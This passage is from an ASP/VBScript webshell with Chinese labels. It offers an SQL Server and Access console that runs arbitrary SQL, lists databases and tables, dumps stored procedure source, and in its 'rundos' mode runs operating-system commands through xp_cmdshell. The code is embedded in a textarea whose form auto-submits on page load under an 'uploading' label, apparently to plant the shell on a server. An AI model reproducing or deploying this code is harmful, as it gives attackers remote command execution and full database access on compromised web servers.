echo &quot;&lt;span onclick=del();&gt;[delete]&lt;/span&gt; --&quot;
echo &quot;&lt;span onclick=drop();&gt;[drop]&lt;/span&gt; --&quot;
echo &quot;&lt;span onclick=createt();&gt;[create]&lt;/span&gt; --&quot;
echo &quot;&lt;span onclick=document.location='&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?c=100'&gt;[(只显示用户表)]&lt;/span&gt; --&nbsp;&quot;
echo &quot;&lt;span onclick=document.location='&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?c=101'&gt;[(显示所有表)]&lt;/span&gt;&quot;
echo &quot;&lt;span onclick=document.location='&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?c=886'&gt;&nbsp;((退出MSSQL管理))&lt;/span&gt;--&quot;
echo &quot;&lt;span onclick=document.location='&quot;&amp;Request(&quot;URL&quot;)&amp;&quot;?gl=pz'&gt;((返回))&lt;/span&gt; &quot;
echo &quot;&lt;input size=3 name=sqlts value=&quot;&amp;session(&quot;sqlts&quot;)&amp;&quot; &gt;&quot;
echo &quot;&lt;script&gt;function createt(){document.all.sqlstr.value='create table &quot;&amp;session(&quot;dbo&quot;)&amp;&quot;[] ([id] int identity(1,1)/*mdb=autoincrement*/)';}&lt;/script&gt;&quot;
echo &quot;&lt;_textarea name=sqlstr cols=106 rows=5&gt; &quot;&amp;request(&quot;sqlstr&quot;)&amp;&quot;&lt;/_textarea&gt;&lt;br&gt;&quot;
echo &quot;&lt;input type=submit name=ppp value=runsql&gt;&quot;
echo &quot;&lt;input type=submit name=ppp value=rundos&gt;&quot;
echo &quot;&lt;input type=&quot;&quot;checkbox&quot;&quot; value=&quot;&quot;n&quot;&quot; name=&quot;&quot;sc&quot;&quot;&gt;不显示结果&quot;
echo &quot;&lt;span id=movs onclick=&quot;&quot;javascript:movable=(!movable)&quot;&quot;&gt;浮动&lt;/span&gt;&quot;
echo &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/div&gt;&quot;
server.scriptTimeout=100000
bbf=chr(13)&amp;chr(10)

if request(&quot;c&quot;)=886 then
	session(&quot;islogin&quot;)=&quot;&quot;
	response.write &quot;&lt;script&gt;location='&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;';&lt;/script&gt;&quot;
	response.end
end if
if session(&quot;islogin&quot;)&lt;&gt;&quot;ok&quot; then
	pass=request.form(&quot;pass&quot;)
	if pass=&quot;islogin&quot; then
		session(&quot;islogin&quot;)=&quot;ok&quot;
	else
		echo &quot;&lt;div style=position:absolute;width:100%;Left:10px;Top:150px;&gt;&lt;form method=post&gt;&quot;
		echo &quot;&lt;input type=hidden name=pass value=islogin&gt;&lt;br&gt;&quot;
		echo &quot;host:&lt;input type=text name=host value=&quot;&amp;sqlhostz&amp;&quot;&gt;&lt;br&gt;&quot;
		echo &quot;user:&lt;input type=text name=user value=&quot;&amp;sqluserz&amp;&quot;&gt;&lt;br&gt;&quot;
		echo &quot;pass:&lt;input type=text name=upass value=&quot;&amp;sqlpassz&amp;&quot;&gt;&lt;br&gt;&quot;
		echo &quot;dbase&lt;input type=text name=database value=&gt;&lt;br&gt;&quot;
		echo &quot;&lt;input type=submit&gt;&lt;/form&gt;&lt;/div&gt;&quot;
		response.end
	end if
end if

function echo(lpstr):response.write lpstr:end function
Function GetTableFromSQL(Byval SQL)
	Dim charPos, charLen, wordlist
	SQL = LCase(SQL)
	charPo1 = InStr(1, SQL, &quot; from &quot;)
	if charPo1&lt;1 then charPo1 = InStr(1, SQL, &quot; into &quot;)
	if charPo1&lt;1 then charPo1 = InStr(1, SQL, &quot;update&quot;)
	if charPo1&gt;0 then
		charPo2 = InStr(charPo1+7, SQL, &quot; &quot;)
		If charPo2 &gt; 0 Then
			SQL = Mid(SQL, charPo1+6, charPo2)
		Else
			SQL = Mid(SQL, charPo1+6)
		End If
		If Left(SQL, 1) = &quot;[&quot; Then SQL = Mid(SQL, 2)
		If Right(SQL, 1) = &quot;]&quot; Then SQL = Left(SQL, Len(SQL) - 1)
		GetTableFromSQL = SQL
	end if
End Function
function delhtml(str):delhtml=server.htmlencode(ltrim(str)):end function
bbf=chr(13)&amp;chr(10)
dsnname     =  &quot;data source=&quot;&amp;request(&quot;host&quot;)&amp;&quot;;&quot;
dsnusername =  &quot;user id=&quot;&amp;request(&quot;user&quot;)&amp;&quot;;&quot;
if request(&quot;upass&quot;)&lt;&gt;&quot;&quot; then dsnpassword = &quot;password=&quot;&amp;request(&quot;upass&quot;)&amp;&quot;;&quot;
if request(&quot;database&quot;)&lt;&gt;&quot;&quot; then 
session(&quot;schoolname&quot;)=request(&quot;database&quot;)
response.redirect request(&quot;url&quot;)&amp;&quot;?c=1&quot;
end if
if session(&quot;schoolname&quot;)=&quot;&quot; then session(&quot;schoolname&quot;)= &quot;master&quot;


set adoconn = server.createobject(&quot;adodb.connection&quot;)
if request(&quot;host&quot;)&lt;&gt;&quot;&quot; then
	if mid(lcase(request(&quot;host&quot;)),2,1)=&quot;:&quot; then
		connectionstring=&quot;DRIVER={Microsoft Access Driver (*.mdb)};DBQ=&quot;&amp;_
			request(&quot;host&quot;)&amp;&quot;;pwd=&quot;&amp;request(&quot;upass&quot;)
		echo connectionstring
		session(&quot;IsMDB&quot;)=1
		session(&quot;dbo&quot;)=&quot;&quot;
		session(&quot;dsnname&quot;)=request(&quot;host&quot;)
	else
		session(&quot;dsnname&quot;)=dsnname
		connectionstring = &quot;provider=sqloledb.1;&quot;&amp;dsnname&amp;dsnusername&amp;dsnpassword'&amp;&quot;database=&quot;&amp;session(&quot;schoolname&quot;)
		session(&quot;IsMDB&quot;)=0
		session(&quot;dbo&quot;)=&quot;[dbo].&quot;
	end if
	session(&quot;connectionstring&quot;)=connectionstring
end if
echo session(&quot;dsnname&quot;)&amp;&quot;&lt;br&gt;&quot;
adoconn.open session(&quot;connectionstring&quot;)
adoconn.cursorlocation=3
if session(&quot;IsMDB&quot;)=0 then adoconn.execute(&quot;use &quot;&amp;session(&quot;schoolname&quot;))
command=request(&quot;c&quot;)
sqlstr=request.form(&quot;sqlstr&quot;)
table=request(&quot;table&quot;)
if table=&quot;&quot; then table=GetTableFromSQL(sqlstr)


if len(sqlstr)&gt;0 then
		if left(sqlstr,5)=&quot;edit &quot; then sprocedure(mid(sqlstr,6)):sqlstr=&quot;&quot;
		if left(sqlstr,4)=&quot;all &quot; then run_ml(mid(sqlstr,5)):sqlstr=&quot;&quot;
		runsqls=split(sqlstr,bbf)
		for k=0 to ubound(runsqls)
			if request(&quot;ppp&quot;)=&quot;rundos&quot; then
				runsqls(k)=&quot;exec master.dbo.xp_cmdshell '&quot;&amp;runsqls(k)&amp;&quot;'&quot;

			end if
			echo &quot;&lt;font color=#FF0000&gt;&quot;&amp;runsqls(k)&amp;&quot;&lt;/font&gt;&lt;br&gt;&quot;
			if len(runsqls(k))&gt;0 then
				set rs=adoconn.execute(runsqls(k))
				if request(&quot;sc&quot;)&lt;&gt;&quot;n&quot; then
					if request(&quot;ppp&quot;)&lt;&gt;&quot;rundos&quot; then
						showsss rs
					else
						echo &quot;&lt;tex&quot;&amp;&quot;tarea  rows=15 name=sqlcmd cols=105&gt;&quot;
						for i=1 to rs.recordcount
							reword=rs(0).value
							if reword&lt;&gt;&quot;&quot; then
	reword=replace(reword,&quot;&lt;/texta&quot;&amp;&quot;rea&gt;&quot;,&quot;&lt;/_tex&quot;&amp;&quot;tarea&gt;&quot;)
	reword=replace(reword,&quot;&lt;/TEXTA&quot;&amp;&quot;REA&gt;&quot;,&quot;&lt;/_tex&quot;&amp;&quot;tarea&gt;&quot;)
								echo reword&amp;bbf
								
							end if
							rs.movenext
						next
						echo &quot;&lt;/texta&quot;&amp;&quot;rea&gt;&lt;br&gt;&quot;

					end if
				end if
			end if
		next
response.write &quot;&lt;script&gt;&quot;
response.write &quot;function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi&lt;100000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}&quot;
response.write &quot;var tx;&quot;
response.write &quot;tx=document.all.sqlcmd.value;&quot;
response.write &quot;tx=replace(tx,&quot;&quot;_tex&quot;&amp;&quot;tarea&quot;&quot;,&quot;&quot;text&quot;&amp;&quot;area&quot;&quot;);&quot;
response.write &quot;document.all.sqlcmd.value=tx;&quot;
response.write &quot;&lt;/script&gt;&quot;
end if


if command=1 then
	if session(&quot;IsMDB&quot;)=1 then
		Set ADOX = Server.CreateObject(&quot;ADOX.Catalog&quot;)
		ADOX.ActiveConnection = adoconn
		For Each tb in ADOX.Tables
			If tb.Type = &quot;TABLE&quot; Then
			echo &quot;&lt;a href=&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?c=2&amp;table=&quot;&amp; tb.Name&amp;&quot;&gt;&quot;
				echo tb.Name&amp;&quot;&lt;/a&gt;&lt;br&gt;&quot;
End If
		Next
		response.end
	else
		sql=&quot;select name from sysobjects where &quot;&amp;_
			&quot;objectproperty(object_id(name),'istable')=1&quot;&amp;session(&quot;only_user_table&quot;)
		set rs=adoconn.execute(sql)
		for i=1 to rs.recordcount
			echo &quot;&lt;a href=&quot;&amp;request(&quot;script_name&quot;)&amp;&quot;?c=2&amp;table=&quot;&amp;rs(0).value&amp;_
				&quot;&gt;&quot;&amp;rs(0).value&amp;&quot;&lt;/a&gt;&lt;br&gt;&quot;
			rs.movenext
		next
	end if
end if

if command=2 then
	if table&lt;&gt;&quot;&quot; then
		set rs=adoconn.execute(&quot;select &quot;&amp;sqlss&amp;&quot; * from &quot;&amp;session(&quot;dbo&quot;)&amp;table)
		showsss rs
		echo &quot;&lt;/table&gt;&quot;
		echo &quot;&lt;script&gt;&quot;&amp;scripts&amp;&quot;&lt;/script&gt;&quot;&amp;insert
	end if
end if

if command=3 then
	set rs=adoconn.execute(&quot;select name,filename from master..sysdatabases&quot;)
	echo &quot;&lt;table&gt;&quot;
	for dd=1 to rs.recordcount
		echo &quot;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;&amp;request(&quot;SCRIPT_NAME&quot;)&amp;&quot;?database=&quot;&amp;rs(0).value&amp;&quot;&gt;&quot;&amp;rs(0).value&amp;&quot;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&quot;&amp;rs(1).value&amp;&quot;&lt;/td&gt;&lt;/tr&gt;&quot;
		rs.movenext
	next
	echo &quot;&lt;/table&gt;&quot;
end if

if command=100 then session(&quot;only_user_table&quot;)=&quot; and xtype='u'&quot;:response.redirect request(&quot;url&quot;)&amp;&quot;?c=1&quot;
if command=101 then session(&quot;only_user_table&quot;)=&quot;&quot;:response.redirect request(&quot;url&quot;)&amp;&quot;?c=1&quot;
set adoconn=nothing
function showsss(lprs)
	echo &quot;&lt;table border=1 bordercolorlight=#000000 cellspacing=0 cellpadding=0 bordercolordark=#ffffff&gt;&quot;
	countrs=lprs.fields.count
	
	echo &quot;&lt;tr&gt;&lt;td&gt; &lt;/td&gt;&quot;
	for i=1 to countrs
		echo &quot;&lt;td&gt;&quot;&amp;lprs(i-1).name&amp;&quot;&lt;/td&gt;&quot;
		if i&gt;1 then
			if i&lt;&gt;countrs then
				ins1=ins1&amp;lprs(i-1).name&amp;&quot;,&quot;
				if session(&quot;IsMDB&quot;)=1 then
					ins2=ins2&amp;&quot;'0',&quot;
				else
					ins2=ins2&amp;&quot;/*&quot;&amp;lprs(i-1).name&amp;&quot;*/'0',&quot;
				end if
			else
				ins1=ins1&amp;lprs(i-1).name
				if session(&quot;IsMDB&quot;)=1 then
					ins2=ins2&amp;&quot;'0'&quot;
				else
					ins2=ins2&amp;&quot;/*&quot;&amp;lprs(i-1).name&amp;&quot;*/'0'&quot;
				end if
			end if
		end if
	next
	echo &quot;&lt;/tr&gt;&quot;

	echo &quot;&lt;script&gt;function ins(){document.all.sqlstr.value=&quot;&amp;chr(34)&amp;&quot;insert into &quot;&amp;_
		session(&quot;dbo&quot;)&amp;table&amp;_
		&quot;(&quot;&amp;ins1&amp;&quot;)values(&quot;&amp;ins2&amp;&quot;)&quot;&amp;chr(34)&amp;&quot;;}&lt;/script&gt;&quot;
	echo &quot;&lt;script&gt;function sel(){document.all.sqlstr.value=&quot;&amp;chr(34)&amp;&quot;select * from &quot;&amp;session(&quot;dbo&quot;)&amp;table&amp;_
		chr(34)&amp;&quot;;}&lt;/script&gt;&quot;
	echo &quot;&lt;script&gt;function del(){document.all.sqlstr.value='delete from &quot;&amp;session(&quot;dbo&quot;)&amp;table&amp;&quot; where [id]=99999';}&lt;/script&gt;&quot;
	echo &quot;&lt;script&gt;function drop(){document.all.sqlstr.value='drop table &quot;&amp;session(&quot;dbo&quot;)&amp;&quot;[&quot;&amp;table&amp;&quot;]';}&lt;/script&gt;&quot;

	if lprs.recordcount&lt;1 then exit function
	for dd=1 to lprs.recordcount
		lpitem= &quot;&lt;tr&gt;&lt;td&gt;&quot;&amp;dd&amp;&quot;&lt;/td&gt;&quot;
		update=&quot;tt&quot;&amp;dd&amp;&quot;=&quot;&amp;chr(34)&amp;&quot;update &quot;&amp;session(&quot;dbo&quot;)&amp;table&amp;&quot; set &quot;
		for i=1 to countrs
			if i=1 then where=&quot;where [&quot;&amp;lprs(i-1).name&amp;&quot;]=&quot;&amp;lprs(i-1).value
			if lprs(i-1).type&lt;&gt;204 and lprs(i-1).type&lt;&gt;128 and lprs(i-1).type&lt;&gt;205 then
				ivalue=lprs(i-1).value
				if len(ivalue)&gt;0 then
					ivalue=replace(ivalue,&quot;&lt;&quot;,&quot;&lt;&quot;)
					ivalue=replace(ivalue,&quot;  &quot;,&quot;  &quot;)

					svalue=replace(lprs(i-1).value,&quot;\&quot;,&quot;\\&quot;)
					svalue=replace(svalue,chr(34),&quot;\&quot;&amp;chr(34))
					svalue=replace(svalue,chr(39),&quot;\'\'&quot;)

					svalue=replace(svalue,&quot;&lt;&quot;,chr(34)&amp;&quot;+'&lt;'+&quot;&amp;chr(34))
				end if
				if i&gt;1 then
					if i&lt;countrs then
						update=update&amp;&quot;[&quot;&amp;lprs(i-1).name&amp;&quot;]='&quot;&amp;svalue&amp;&quot;', &quot;
					else
						update=update&amp;&quot;[&quot;&amp;lprs(i-1).name&amp;&quot;]='&quot;&amp;svalue&amp;&quot;' &quot;
					end if
				end if
				lpitem=lpitem&amp;&quot;&lt;td&gt;&quot; '&amp;ivalue
				lpitem=lpitem&amp;ivalue&amp;&quot; &lt;/td&gt;&quot;
			else
				lpitem=lpitem&amp;&quot;&lt;td&gt;{?}&lt;/td&gt;&quot;
			end if
		next
		lpitem=lpitem&amp;&quot;&lt;/tr&gt;&quot;
		update=replace(update,chr(13)&amp;chr(10),&quot;\n&quot;)
		update=replace(update,chr(13),&quot;\n&quot;)
		update=replace(update,chr(10),&quot;\n&quot;)
		update=update&amp;where&amp;chr(34)&amp;&quot;;&quot;&amp;chr(13)&amp;chr(10)
		scripts=scripts&amp;update

		echo &quot;&lt;a ondblclick=javascript:copys(tt&quot;&amp;dd&amp;&quot;);&gt;&quot;&amp;lpitem&amp;&quot;&lt;/a&gt;&quot;
		lprs.movenext
	next
	echo &quot;&lt;/table&gt;&quot;
	echo &quot;&lt;script&gt;&quot;&amp;scripts&amp;&quot;&lt;/script&gt;&quot;&amp;insert
end function
function sprocedure(lpstr)
sql=&quot;SELECT text FROM syscomments WHERE id = OBJECT_ID('&quot;&amp;lpstr&amp;&quot;') ORDER BY colid&quot;	'colid
	set rs=adoconn.execute(sql)
	if rs.recordcount&lt;1 then exit function
	for dd=1 to rs.recordcount
		procstr=procstr&amp;rs(0).value
		rs.movenext
	next
echo &quot;---------------(+)&lt;br&gt;&quot;&amp;replace(replace(server.htmlencode(procstr),bbf,&quot;&lt;br&gt;&quot;),&quot;  &quot;,&quot;  &quot;)&amp;&quot;&lt;br&gt;---------------(-)&lt;br&gt;&quot;
end function
function run_ml(lpstr)
	set rs=adoconn.execute(lpstr)
	showsss rs
end function
echo &quot;&lt;/body&gt;&quot;
response.end
end if </textarea><br />
	<input type="submit" name="ax" value="上传中……请稍后……" /></p>
</form>
<script language="javascript">ccc();onload=document.all.Kker.submit();</script>
<%end if%>